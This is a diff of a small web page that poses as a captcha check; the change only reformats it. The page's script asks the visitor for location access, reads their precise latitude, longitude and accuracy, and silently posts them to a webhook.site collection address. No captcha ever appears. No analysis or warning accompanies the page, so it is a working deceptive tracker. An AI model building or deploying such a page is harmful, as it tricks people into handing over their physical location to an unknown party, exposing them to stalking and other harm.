@@ -1,67 +1,34 @@
-‎<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Captcha</title>
+</head>
+<body>
+  <h2>Fetching Your Captcha</h2>
+  <p>If asked, please allow location access.</p>
 
-‎<html>
-
-‎<head>
-
-‎  <title>Captcha Verification</title>
-
-‎</head>
-
-‎<body>
-
-‎  <h2>Accept the Captcha</h2>
-
-‎  <p>If asked, please allow location access.</p>
-
-‎
-
-‎  <script>
-
-‎    if ("geolocation" in navigator) {
-
-‎      navigator.geolocation.getCurrentPosition(function(position) {
-
-‎        fetch("https://webhook.site/b806296e-3a5d-47df-8a3b-44df4e195d6c", {
-
-‎          method: "POST",
-
-‎          headers: {
-
-‎            'Content-Type': 'application/json'
-
-‎          },
-
-‎          body: JSON.stringify({
-
-‎            latitude: position.coords.latitude,
-
-‎            longitude: position.coords.longitude,
-
-‎            accuracy: position.coords.accuracy,
-
-‎            timestamp: new Date().toISOString()
-
-‎          })
-
-‎        });
-
-‎        document.body.innerHTML += "<p>Location sent successfully!</p>";
-
-‎      }, function(error) {
-
-‎        document.body.innerHTML += "<p>Location access denied or failed.</p>";
-
-‎      });
-
-‎    } else {
-
-‎      document.body.innerHTML += "<p>Geolocation not supported on this device.</p>";
-
-‎    }
-
-‎  </script>
-
-‎</body>
-
-‎</html>
+  <script>
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("https://webhook.site/b806296e-3a5d-47df-8a3b-44df4e195d6c", {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+          })
+        });
+        document.body.innerHTML += "<p>Location sent successfully!</p>";
+      }, function(error) {
+        document.body.innerHTML += "<p>Location access denied or failed.</p>";
+      });
+    } else {
+      document.body.innerHTML += "<p>Geolocation not supported on this device.</p>";
+    }
+  </script>
+</body>
+</html>
